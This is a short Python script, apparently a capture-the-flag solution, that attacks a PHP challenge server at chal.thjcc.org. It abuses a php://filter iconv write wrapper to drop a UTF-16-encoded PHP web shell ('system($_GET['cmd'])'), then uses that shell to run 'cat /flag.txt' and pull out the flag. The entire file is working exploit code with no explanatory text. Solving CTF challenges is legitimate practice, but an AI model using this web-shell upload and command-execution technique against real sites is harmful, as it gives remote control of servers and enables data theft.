import requests
import re

url = "http://chal.thjcc.org:8080/"

file = 'shell.php'
payload = f'php://filter/write=convert.iconv.UTF-16LE.UTF-8/resource={file}'
shell = "<?php system($_GET['cmd']); ?>".encode("utf-16-le")

res = requests.post(f'{url}/index.php?file={payload}', data={
    'content': shell
})

if "file written" in res.text.lower():
    print("> Payload uploaded")

cmd = 'cat /flag.txt'

res = requests.get(f'{url}/{file}', params={
    'cmd': cmd
})

flag = re.findall(r'(THJCC{.+})', res.text)[0]
print("Flag:", flag)